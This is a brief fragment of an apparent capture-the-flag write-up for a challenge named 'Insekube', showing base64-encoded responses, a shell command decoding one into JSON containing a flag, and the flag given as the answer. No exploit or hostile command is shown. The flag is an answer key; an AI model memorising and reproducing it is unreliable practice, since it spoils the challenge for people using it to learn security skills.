eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9

┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"} 

Was really fun!

```

What is the flag?

*flag{18d44fc0707ac8dc8be45bb83db54013}*

[[Insekube]]